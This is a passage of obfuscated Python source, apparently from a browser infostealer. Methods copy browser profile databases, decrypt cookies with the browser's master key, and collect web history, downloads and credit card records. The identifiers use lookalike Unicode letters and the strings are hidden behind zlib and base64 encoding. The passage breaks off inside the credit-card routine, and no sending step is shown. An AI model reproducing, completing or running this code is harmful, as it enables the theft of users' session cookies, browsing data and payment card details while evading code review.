                if not 𝙧𝙤𝙬[𝘪𝗻𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 922 - (𝗶𝙣𝘵(𝗢) + 𝘪), 𝗺𝗮𝙥(__𝙞𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘁𝘦𝘳(__𝗶𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝗻𝙜𝗲(0)), __𝘪𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝗼𝙬[𝙞𝙣𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 848 - (𝘪𝙣𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝗶𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝘪𝘁𝙚𝙧(__𝘪𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3w\t4\x06\x00\x02\xe1\x01\x18')).decode())] * 3)), 𝘳𝘢𝘯𝗴𝘦(1)), __𝘪𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝗼𝙬[𝗶𝘯𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 805 - (𝘪𝗻𝘵(𝘖) + 𝙞), 𝘮𝗮𝘱(__𝙞𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝙩𝗲𝘳(__𝗶𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3wq\xac\x02\x00\x03\x08\x01O')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝗲(1)), __𝗶𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝙧𝙤𝙬[𝙞𝗻𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 269 - (𝘪𝙣𝙩(𝘖) + 𝙞), 𝗺𝗮𝗽(__𝗶𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝘪𝘁𝙚𝘳(__𝘪𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcd\x8a4\x02\x00\x03Z\x01C')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝙚(1)), __𝘪𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                    continue
                𝙘𝘰𝙤𝙠𝙞𝘦 = 𝘴𝗲𝙡𝘧.decrypt_password(𝙧𝗼𝙬[𝗶𝗻𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 755 - (𝗶𝗻𝘵(𝘖) + 𝙞), 𝘮𝙖𝘱(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝙞𝙩𝘦𝙧(__𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xab\n\xad\x04\x00\x03\xcd\x01\x97')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝙚(1)), __𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝘦𝗹𝙛.master_key)
                __𝘊𝗢𝘖𝙆𝘐𝗘𝙎__.append(𝗧𝙮𝗽𝙚𝘴.Cookie(𝗿𝘰𝘸[𝙞𝘯𝘵.from_bytes(𝗺𝙖𝘱(lambda O, i: 692 - (𝙞𝗻𝘵(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝙞𝙩𝗲𝗿(__𝘪𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝗲(0)), __𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘄[𝙞𝗻𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 271 - (𝙞𝘯𝘵(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝙞𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝗶𝙩𝘦𝙧(__𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcdJ.\x07\x00\x03\xb3\x01\x92')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝙚(1)), __𝘪𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝙬[𝙞𝘯𝘁.from_bytes(𝘮𝗮𝘱(lambda O, i: 511 - (𝙞𝗻𝙩(𝘖) + 𝙞), 𝘮𝙖𝘱(__𝙞𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝙩𝙚𝙧(__𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0bq4\x05\x00\x02\xef\x01\x19')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝘦(1)), __𝘪𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝗼𝗼𝙠𝗶𝙚, 𝙧𝙤𝘄[𝗶𝘯𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 560 - (𝗶𝙣𝘵(𝙊) + 𝘪), 𝘮𝙖𝘱(__𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘁𝗲𝘳(__𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\t5\x02\x00\x03\x14\x01*')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝙚(1)), __𝙞𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
            𝙘𝙤𝗻𝘯.close()
        except 𝗘𝘹𝙘𝘦𝗽𝙩𝘪𝘰𝙣 as e:
            𝘱𝘳𝗶𝘯𝘁(𝗲)
        𝗼𝘀.remove(__𝙞𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())

    def get_web_history(self, path, profile):
        𝘸𝙚𝙗_𝙝𝗶𝘴𝘁𝙤𝘳𝙮_𝙙𝗯 = __𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝙥𝗮𝙩𝙝, 𝙥𝘳𝗼𝘧𝘪𝘭𝘦)
        if not 𝙤𝙨.path.exists(𝘸𝗲𝗯_𝗵𝙞𝙨𝘵𝗼𝗿𝘺_𝙙𝘣):
            return
        𝘴𝙝𝘂𝘁𝗶𝗹.copy(𝘄𝙚𝗯_𝗵𝙞𝘴𝘵𝘰𝘳𝘺_𝘥𝗯, __𝗶𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝙘𝙤𝙣𝘯 = 𝘀𝗾𝗹𝘪𝙩𝙚3.connect(__𝗶𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝘤𝙪𝘳𝘴𝘰𝗿 = 𝗰𝗼𝙣𝙣.cursor()
        𝘤𝘶𝗿𝙨𝙤𝙧.execute(__𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝗿𝘰𝘄 in 𝗰𝘂𝘳𝘴𝘰𝗿.fetchall():
            if not 𝗿𝙤𝙬[𝙞𝘯𝘵.from_bytes(𝘮𝙖𝙥(lambda O, i: 387 - (𝙞𝘯𝘵(𝘖) + 𝘪), 𝗺𝘢𝗽(__𝘪𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝗶𝙩𝙚𝘳(__𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝗲(0)), __𝘪𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝘸[𝘪𝙣𝘁.from_bytes(𝘮𝙖𝗽(lambda O, i: 792 - (𝙞𝘯𝙩(𝙊) + 𝘪), 𝗺𝙖𝙥(__𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝙞𝙩𝙚𝗿(__𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\xca\xae\x00\x00\x03\xf8\x01\xac')).decode())] * 3)), 𝙧𝗮𝙣𝙜𝘦(1)), __𝗶𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝘰𝙬[𝙞𝗻𝘵.from_bytes(𝘮𝗮𝙥(lambda O, i: 305 - (𝙞𝗻𝘁(𝙊) + 𝙞), 𝗺𝘢𝗽(__𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝘦𝙧(__𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadr\xac\x02\x00\x03\xa2\x01\x83')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝗲(1)), __𝙞𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝗪𝗘𝘽_𝗛𝙄𝗦𝘛𝘖𝙍𝙔__.append(𝘛𝙮𝘱𝗲𝙨.WebHistory(𝘳𝘰𝙬[𝙞𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 779 - (𝘪𝘯𝘁(𝗢) + 𝙞), 𝘮𝙖𝗽(__𝙞𝘮𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝙩𝗲𝗿(__𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝙚(0)), __𝘪𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝘄[𝗶𝗻𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 993 - (𝙞𝗻𝘁(𝗢) + 𝗶), 𝗺𝗮𝘱(__𝙞𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝘪𝘁𝗲𝘳(__𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xc9\xae\x04\x00\x03\x8b\x01\x88')).decode())] * 3)), 𝙧𝙖𝙣𝗴𝘦(1)), __𝙞𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘄[𝘪𝗻𝘵.from_bytes(𝗺𝗮𝙥(lambda O, i: 315 - (𝗶𝗻𝙩(𝗢) + 𝙞), 𝘮𝗮𝗽(__𝗶𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘵𝙚𝙧(__𝘪𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xadr\xad\x02\x00\x03\xaa\x01\x87')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝙚(1)), __𝗶𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝗼𝙣𝘯.close()
        𝙤𝘀.remove(__𝙞𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())

    def get_downloads(self, path, profile):
        𝗱𝗼𝙬𝙣𝙡𝘰𝘢𝙙𝙨_𝙙𝙗 = __𝗶𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝗽𝙖𝙩𝙝, 𝗽𝗿𝙤𝙛𝙞𝙡𝗲)
        if not 𝙤𝘀.path.exists(𝘥𝘰𝘸𝘯𝙡𝗼𝘢𝗱𝘀_𝘥𝙗):
            return
        𝘴𝙝𝘶𝙩𝗶𝗹.copy(𝙙𝘰𝙬𝙣𝘭𝘰𝙖𝘥𝙨_𝘥𝗯, __𝘪𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝙘𝗼𝘯𝗻 = 𝙨𝗾𝘭𝘪𝘵𝙚3.connect(__𝗶𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝗰𝘶𝗿𝘴𝙤𝘳 = 𝗰𝗼𝗻𝙣.cursor()
        𝙘𝘶𝗿𝘴𝗼𝗿.execute(__𝗶𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝗿𝘰𝘄 in 𝗰𝘶𝗿𝘀𝗼𝘳.fetchall():
            if not 𝘳𝙤𝘸[𝘪𝘯𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 874 - (𝘪𝙣𝙩(𝙊) + 𝘪), 𝘮𝗮𝗽(__𝗶𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝘵𝙚𝙧(__𝘪𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝘯𝗴𝙚(0)), __𝘪𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝗼𝘸[𝘪𝘯𝘁.from_bytes(𝘮𝗮𝘱(lambda O, i: 968 - (𝗶𝘯𝙩(𝙊) + 𝘪), 𝘮𝙖𝗽(__𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝘵𝙚𝙧(__𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0f\x894\x06\x00\x03!\x010')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝙚(1)), __𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝘿𝘖𝗪𝙉𝗟𝘖𝘈𝘋𝘚__.append(𝗧𝘺𝘱𝙚𝙨.Download(𝗿𝙤𝘄[𝘪𝘯𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 671 - (𝗶𝘯𝙩(𝘖) + 𝗶), 𝘮𝘢𝘱(__𝙞𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘵𝘦𝗿(__𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝙣𝘨𝙚(0)), __𝘪𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝙬[𝘪𝙣𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 351 - (𝗶𝘯𝘁(𝘖) + 𝙞), 𝙢𝗮𝗽(__𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝗶𝘁𝗲𝘳(__𝙞𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\n-\x07\x00\x03\xc7\x01\x94')).decode())] * 3)), 𝗿𝙖𝘯𝗴𝘦(1)), __𝘪𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝘤𝘰𝘯𝙣.close()
        𝘰𝘴.remove(__𝘪𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path, profile):
        𝙘𝙖𝗿𝘥𝘀_𝗱𝘣 = __𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK56LN\x05\xe20\xa3\xb0LO\xd7\xa0\x8c\x14wW[\x00?N\x06\x15')).decode().format(𝙥𝙖𝙩𝙝, 𝙥𝗿𝘰𝗳𝗶𝗹𝗲)
        if not 𝘰𝙨.path.exists(𝙘𝘢𝘳𝗱𝘴_𝘥𝘣):
            return
        𝘴𝘩𝘶𝘵𝙞𝘭.copy(𝘤𝙖𝗿𝙙𝙨_𝘥𝗯, __𝗶𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝙘𝘰𝗻𝙣 = 𝘀𝗾𝙡𝗶𝘁𝘦3.connect(__𝘪𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝘂𝗿𝙨𝘰𝙧 = 𝗰𝗼𝘯𝘯.cursor()
        𝘤𝙪𝙧𝘴𝘰𝗿.execute(__𝙞𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝘳𝗼𝙬 in 𝗰𝘂𝘳𝘀𝙤𝙧.fetchall():
            if not 𝙧𝙤𝘄[𝘪𝗻𝘁.from_bytes(𝘮𝘢𝘱(lambda O, i: 771 - (𝘪𝙣𝘵(𝙊) + 𝘪), 𝘮𝘢𝘱(__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝘪𝘁𝘦𝗿(__𝗶𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝙚(0)), __𝘪𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝙤𝘄[𝘪𝘯𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 494 - (𝗶𝙣𝙩(𝙊) + 𝘪), 𝘮𝘢𝘱(__𝗶𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝙩𝙚𝙧(__𝗶𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3s\xc9\xae\x02\x00\x03X\x01x')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝗲(1)), __𝘪𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝙤𝙬[𝗶𝗻𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 320 - (𝗶𝘯𝘵(𝗢) + 𝙞), 𝙢𝘢𝗽(__𝘪𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 